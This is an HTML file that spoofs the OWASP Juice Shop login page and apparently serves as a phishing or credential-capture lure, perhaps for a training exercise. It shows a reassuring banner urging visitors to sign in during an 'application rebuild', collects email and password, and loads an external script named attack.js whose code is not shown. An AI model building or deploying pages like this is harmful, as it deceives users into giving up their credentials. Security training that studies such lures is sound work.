<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OWASP Juice Shop Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #2f4757;
            margin: 0;
        }

        .header {
            background-color: #44677d;
            padding: 15px;
            color: white;
            font-size: 20px;
            display: flex;
            align-items: center;
        }

        .header img {
            height: 30px;
            margin-right: 10px;
        }

        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 90vh;
            flex-direction: column;
        }

        .notice {
            background-color: #ffcc00;
            color: #333;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 20px;
            text-align: center;
            font-weight: bold;
        }

        .login-container {
            background-color: #303030;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
            width: 350px;
            color: white;
        }

        h2 {
            text-align: center;
            margin-bottom: 20px;
        }

        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #777;
            border-radius: 5px;
            background-color: #424242;
            color: white;
        }

        .password-container {
            display: flex;
            align-items: center;
            position: relative;
        }

        .eye-icon {
            position: absolute;
            right: 10px;
            cursor: pointer;
        }

        button {
            width: 100%;
            padding: 12px;
            background-color: #555;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
        }

        .google-login {
            background-color: #4caf50;
        }
    </style>
</head>
<body>
    <div class="header">
        <img src="https://raw.githubusercontent.com/bkimminich/juice-shop/master/frontend/src/assets/public/images/JuiceShop_Logo.png" alt="Juice Shop Logo">
        <span>OWASP Juice Shop</span>
    </div>
    <div class="container">
        <div class="notice">We are currently rebuilding our application. No worries, please proceed with the sign-in.</div>
        <div class="login-container">
            <h2>Login</h2>
            <form id="loginForm">
                <input type="text" id="username" placeholder="Email" required>
                <div class="password-container">
                    <input type="password" id="password" placeholder="Password" required>
                    <span class="eye-icon">üëÅ</span>
                </div>
                <button type="submit">Log in</button>
                <button class="google-login">Log in with Google</button>
            </form>
        </div>
    </div>
    <script src="attack.js"></script>
</body>
</html>
